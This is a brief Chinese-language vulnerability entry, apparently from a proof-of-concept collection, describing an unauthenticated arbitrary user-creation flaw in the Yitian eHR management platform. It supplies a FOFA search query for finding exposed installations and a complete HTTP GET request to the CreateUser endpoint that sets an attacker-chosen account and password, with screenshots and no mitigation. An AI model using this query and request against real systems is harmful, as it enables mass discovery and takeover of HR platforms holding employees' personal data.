## 易天智能eHR管理平台任意用户添加漏洞

温州市易天信息科技有限公司主要经营易天人力资源管理软件，是一家致力于人力资源管理软件产品研发的高科技公司。易天智能eHR管理平台任意用户添加漏洞。

## fofa

```
body="易天智能eHR管理平台"
```

## poc

```
GET /BaseManage/UserAPI/CreateUser?Account=stc&Password=123456&OuterID=888 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Connection: close
Priority: u=1
```

![image-20240621193645026](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406211936086.png)

![image-20240621193657700](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406211936732.png)